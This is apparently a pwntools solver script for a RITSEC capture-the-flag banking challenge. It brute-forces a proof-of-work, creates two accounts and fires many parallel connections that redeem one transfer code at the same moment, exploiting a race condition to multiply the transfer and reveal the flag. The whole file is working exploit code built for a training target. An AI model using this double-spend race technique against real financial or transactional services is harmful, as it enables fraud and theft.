from pwn import *
from time import sleep
from multiprocessing import Process, Event, cpu_count, Queue
import hashlib
import random
import string

printable = string.ascii_letters + string.digits + string.punctuation

def test_challenge(chal, event, q):
    try:
        while 1:
            if event.is_set():
                return
            b = ''.join(random.sample(printable, 10))
            if hashlib.sha1(b).hexdigest().endswith(chal):
                q.put(b)
                event.set()
    except KeyboardInterrupt:
        pass

def solveChallenge(chal):
    ps = []
    e = Event()
    q = Queue()
    for i in range(cpu_count() * 2):
        p = Process(target=test_challenge, args=(chal, e, q))
        ps.append(p)
        p.start()
    try:
        e.wait()
    except KeyboardInterrupt:
        e.set()
    for i in ps:
        i.join()
    return q.get()


def con(e, g, ip, port, username, password, tid, code):
    c1 = connect(ip, int(port))
    c1.readuntil("Choose: ")
    c1.sendline("3")
    c1.readrepeat(.1)
    c1.sendline(username)
    c1.readrepeat(.1)
    c1.sendline(password)
    c1.readuntil("Choose: ")

    e.set()

    c1.sendline("7")
    c1.readrepeat(.1)
    c1.sendline(tid)
    c1.readrepeat(.1)
    g.wait()
    c1.sendline(code)
    c1.readuntil("Choose: ")
    c1.close()

def createAccount(c, user, password):
    c.sendline("1")
    c.readuntil("Username: ")
    c.sendline(user)
    c.readuntil("Password: ")
    c.sendline(password)
    if not c.recvuntil("Proof of work hash: ", timeout=1):
        return False
    h = c.recvline().rstrip()[-6:]
    log.info(h)
    c.sendline(solveChallenge(h))
    if "Incorrect" in c.readuntil("Choose: "):
        raise Exception("Exploit failed. Could not create account for " + user)
    log.success("Registered " + user)
    return True


if __name__ == '__main__':
    import sys
    import random
    import string

    if cpu_count() < 3:
        print("You might have a hard time with this because you have less than 3 cpus")

    if len(sys.argv) != 3:
        print("Usage: {} ip port".format(sys.argv[0]))
        sys.exit(1)

    user1 = ''.join([random.choice(string.ascii_letters) for _ in range(10)])
    pass1 = ''.join([random.choice(string.ascii_letters) for _ in range(10)])
    user2 = ''.join([random.choice(string.ascii_letters) for _ in range(10)])
    pass2 = ''.join([random.choice(string.ascii_letters) for _ in range(10)])

    log.info(user1)
    log.info(pass1)
    log.info(user2)
    log.info(pass2)

    c = connect(sys.argv[1], int(sys.argv[2]))
    if not createAccount(c, user1, pass1):
        log.error("Account already exists: " + user1)
        sys.exit(1)
    c.sendline("8")
    c.recvuntil("Choose: ")
    if not createAccount(c, user2, pass2):
        log.error("Account already exists: " + user2)
        sys.exit(1)
    c.sendline("5")
    c.recvuntil("Transfer to: ")
    c.sendline(user1)
    c.recvuntil("Amount: ")
    c.sendline("100")
    c.recvuntil("ID: ")
    n = c.recvuntil(",", drop=True)
    c.recvuntil("Validation code: ")
    code = c.recvuntil("\n", drop=True)
    log.success("Initiated transfer: ID={}, code={}".format(n, code))
    c.recvuntil("Choose: ")
    c.sendline("8")
    c.recvuntil("Choose: ")

    g = Event()
    p = []
    events = []
    for i in xrange(cpu_count()*2+1):
        log.info("Starting process {}".format(i))
        e = Event()
        events.append(e)
        t = Process(target=con, args=(e, g, sys.argv[1], int(sys.argv[2]), user1, pass1, n, code))
        p.append(t)
        t.start()

    for i in events:
        i.wait()

    log.info("Ready")
    time.sleep(2)

    g.set()

    for i in p:
        i.join()

    log.success("Transfers complete. Checking balance")

    c.sendline("3")
    c.recvuntil("Username: ")
    c.sendline(user2)
    c.recvuntil("Password: ")
    c.sendline(pass2)
    flag = c.recvuntil("Choose: ")
    if "RITSEC{" in flag:
        log.success("Flag: " + flag[flag.find("RITSEC{"):].split()[0])
    else:
        log.error("Fail.")
